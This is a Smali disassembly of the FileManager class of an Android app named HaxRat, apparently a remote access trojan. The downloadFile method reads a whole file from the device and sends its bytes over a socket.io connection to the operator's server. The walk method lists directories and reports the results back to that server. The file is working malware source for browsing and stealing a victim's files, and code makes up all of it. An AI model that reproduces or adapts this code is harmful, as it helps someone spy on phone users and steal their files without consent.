.class public Lcom/hax4us/haxrat/FileManager;
.super Ljava/lang/Object;
.source "FileManager.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 91
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static downloadFile(Ljava/lang/String;)V
    .locals 15
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 64
    move-object v0, p0

    move-object v8, v0

    if-nez v8, :cond_0

    .line 87
    :goto_0
    return-void

    .line 67
    :cond_0
    new-instance v8, Ljava/io/File;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    move-object v10, v0

    invoke-direct {v9, v10}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v2, v8

    .line 69
    move-object v8, v2

    invoke-virtual {v8}, Ljava/io/File;->exists()Z

    move-result v8

    if-eqz v8, :cond_1

    .line 71
    move-object v8, v2

    invoke-virtual {v8}, Ljava/io/File;->length()J

    move-result-wide v8

    long-to-int v8, v8

    move v3, v8

    .line 72
    move v8, v3

    new-array v8, v8, [B

    move-object v4, v8

    .line 74
    :try_start_0
    new-instance v8, Ljava/io/BufferedInputStream;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    new-instance v10, Ljava/io/FileInputStream;

    move-object v14, v10

    move-object v10, v14

    move-object v11, v14

    move-object v12, v2

    invoke-direct {v11, v12}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v9, v10}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    move-object v5, v8

    .line 75
    move-object v8, v5

    move-object v9, v4

    const/4 v10, 0x0

    move-object v11, v4

    array-length v11, v11

    invoke-virtual {v8, v9, v10, v11}, Ljava/io/BufferedInputStream;->read([BII)I

    move-result v8

    .line 76
    new-instance v8, Lorg/json/JSONObject;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    invoke-direct {v9}, Lorg/json/JSONObject;-><init>()V

    move-object v6, v8

    .line 77
    move-object v8, v6

    const-string v9, "type"

    const-string v10, "download"

    invoke-virtual {v8, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v8

    .line 78
    move-object v8, v6

    const-string v9, "name"

    move-object v10, v2

    invoke-virtual {v10}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v8, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v8

    .line 79
    move-object v8, v6

    const-string v9, "buffer"

    move-object v10, v4

    invoke-virtual {v8, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v8

    .line 80
    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;

    move-result-object v8

    invoke-virtual {v8}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v8

    const-string v9, "0xFI"

    const/4 v10, 0x1

    new-array v10, v10, [Ljava/lang/Object;

    move-object v14, v10

    move-object v10, v14

    move-object v11, v14

    const/4 v12, 0x0

    move-object v13, v6

    aput-object v13, v11, v12

    invoke-virtual {v8, v9, v10}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v8

    .line 81
    move-object v8, v5

    invoke-virtual {v8}, Ljava/io/BufferedInputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_2

    .line 87
    :cond_1
    :goto_1
    goto :goto_0

    .line 81
    :catch_0
    move-exception v8

    move-object v5, v8

    .line 83
    move-object v8, v5

    invoke-virtual {v8}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_1

    :catch_1
    move-exception v8

    move-object v5, v8

    .line 85
    move-object v8, v5

    invoke-virtual {v8}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    :catch_2
    move-exception v8

    move-object v5, v8

    .line 87
    move-object v8, v5

    invoke-virtual {v8}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_1
.end method

.method public static walk(Ljava/lang/String;)Lorg/json/JSONArray;
    .locals 18

    .prologue
    .line 23
    move-object/from16 v0, p0

    new-instance v11, Lorg/json/JSONArray;

    move-object/from16 v17, v11

    move-object/from16 v11, v17

    move-object/from16 v12, v17

    invoke-direct {v12}, Lorg/json/JSONArray;-><init>()V

    move-object v2, v11

    .line 24
    new-instance v11, Ljava/io/File;

    move-object/from16 v17, v11

    move-object/from16 v11, v17

    move-object/from16 v12, v17

    move-object v13, v0

    invoke-direct {v12, v13}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v3, v11

    .line 25
    move-object v11, v3

    invoke-virtual {v11}, Ljava/io/File;->canRead()Z

    move-result v11

    if-nez v11, :cond_0

    .line 26
    const-string v11, "cannot"

    const-string v12, "inaccessible"

    invoke-static {v11, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v11

    .line 28
    :try_start_0
    new-instance v11, Lorg/json/JSONObject;

    move-object/from16 v17, v11

    move-object/from16 v11, v17

    move-object/from16 v12, v17

    invoke-direct {v12}, Lorg/json/JSONObject;-><init>()V

    move-object v4, v11

    .line 29
    move-object v11, v4

    const-string v12, "type"

    const-string v13, "error"

    invoke-virtual {v11, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v11

    .line 30
    move-object v11, v4

    const-string v12, "error"

    const-string v13, "Denied"

    invoke-virtual {v11, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v11

    .line 31
    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;

    move-result-object v11

    invoke-virtual {v11}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v11

    const-string v12, "0xFI"

    const/4 v13, 0x1

    new-array v13, v13, [Ljava/lang/Object;

    move-object/from16 v17, v13

    move-object/from16 v13, v17

    move-object/from16 v14, v17

    const/4 v15, 0x0

    move-object/from16 v16, v4

    aput-object v16, v14, v15

    invoke-virtual {v11, v12, v13}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v11

    .line 37
    :cond_0
    :goto_0
    move-object v11, v3

    invoke-virtual {v11}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v11

    move-object v4, v11

    .line 39
    move-object v11, v4

    if-eqz v11, :cond_1

    .line 40
    :try_start_1
    new-instance v11, Lorg/json/JSONObject;

    move-object/from16 v17, v11

    move-object/from16 v11, v17

    move-object/from16 v12, v17

    invoke-direct {v12}, Lorg/json/JSONObject;-><init>()V

    move-object v5, v11

    .line 41
    move-object v11, v5

    const-string v12, "name"

    const-string v13, "../"

    invoke-virtual {v11, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v11

    .line 42
    move-object v11, v5

    const-string v12, "isDir"

    const/4 v13, 0x1

    invoke-virtual {v11, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    move-result-object v11

    .line 43
    move-object v11, v5

    const-string v12, "path"

    move-object v13, v3

    invoke-virtual {v13}, Ljava/io/File;->getParent()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v11, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v11

    .line 44
    move-object v11, v2

    move-object v12, v5

    invoke-virtual {v11, v12}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    move-result-object v11

    .line 45
    move-object v11, v4

    move-object v6, v11

    const/4 v11, 0x0

    move v7, v11

    .line 51
    :goto_1
    move v11, v7

    move-object v12, v6

    array-length v12, v12
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1

    if-lt v11, v12, :cond_2

    .line 60
    :cond_1
    :goto_2
    move-object v11, v2

    move-object v0, v11

    return-object v0

    .line 31
    :catch_0
    move-exception v11

    move-object v4, v11

    .line 33
    move-object v11, v4

    invoke-virtual {v11}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0

    .line 45
    :cond_2
    move-object v11, v6

    move v12, v7

    :try_start_2
    aget-object v11, v11, v12

    move-object v8, v11

    .line 46
    move-object v11, v8

    invoke-virtual {v11}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v11

    const-string v12, "."

    invoke-virtual {v11, v12}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v11

    if-nez v11, :cond_3

    .line 47
    new-instance v11, Lorg/json/JSONObject;

    move-object/from16 v17, v11

    move-object/from16 v11, v17

    move-object/from16 v12, v17

    invoke-direct {v12}, Lorg/json/JSONObject;-><init>()V

    move-object v9, v11

    .line 48
    move-object v11, v9

    const-string v12, "name"

    move-object v13, v8

    invoke-virtual {v13}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v11, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v11

    .line 49
    move-object v11, v9

    const-string v12, "isDir"

    move-object v13, v8

    invoke-virtual {v13}, Ljava/io/File;->isDirectory()Z

    move-result v13

    invoke-virtual {v11, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    move-result-object v11

    .line 50
    move-object v11, v9

    const-string v12, "path"

    move-object v13, v8

    invoke-virtual {v13}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v11, v12, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v11

    .line 51
    move-object v11, v2

    move-object v12, v9

    invoke-virtual {v11, v12}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_1

    move-result-object v11

    :cond_3
    add-int/lit8 v7, v7, 0x1

    goto :goto_1

    :catch_1
    move-exception v11

    move-object v5, v11

    .line 56
    move-object v11, v5

    invoke-virtual {v11}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_2
.end method
